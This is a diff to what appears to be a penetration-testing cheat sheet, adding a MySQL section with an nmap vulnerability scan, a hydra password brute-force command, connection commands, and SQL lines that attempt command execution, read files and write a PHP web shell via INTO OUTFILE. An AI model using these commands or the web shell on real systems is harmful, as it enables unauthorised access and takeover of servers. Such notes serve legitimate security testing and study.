@@ -127,7 +127,6 @@ wget --header "User-Agent: Googlebot-Image" http://192.168.98.14/robots.txt
 
 ### Local File Inclusion
 
-
 ## FTP
 Default Port: 21
 
@@ -226,6 +225,52 @@ Not very efficient but sometimes you can get info such as password policy
 
 ```
 enum4linux -a [ip]
+```
+
+## MySQL
+
+### nmap Scan
+Scan the MySQL port in order to enumerate and find vuln using NMap
+
+```
+nmap -sV -Pn -vv --script=mysql-audit,mysql-databases,mysql-dump-hashes,mysql-empty-password,mysql-enum,mysql-info,mysql-query,mysql-users,mysql-variables,mysql-vuln-cve2012-2122 IP -p PORT
+```
+
+### Brute Force using hydra
+
+```
+hydra -l USER -P rockyou.txt IP mysql
+```
+
+### Connection
+
+```
+# Local
+mysql -u <USER>
+mysql -u <USER> -p
+
+# Remote
+mysql -h <IP> -u <USER>
+```
+
+### Usefull commands
+
+```
+show databases;
+use <DATABASES>;
+
+show tables;
+describe <TABLE>;
+
+select * from <TABLE>;
+
+# Try to execute code
+select do_system('id');
+\! sh
+
+# Read & Write
+select load_file('<FILE>');
+select 1,2,"<?php echo shell_exec($_GET['c']);?>",4 into OUTFILE '<OUT_FILE>'
 ```
 
 # Initial Access
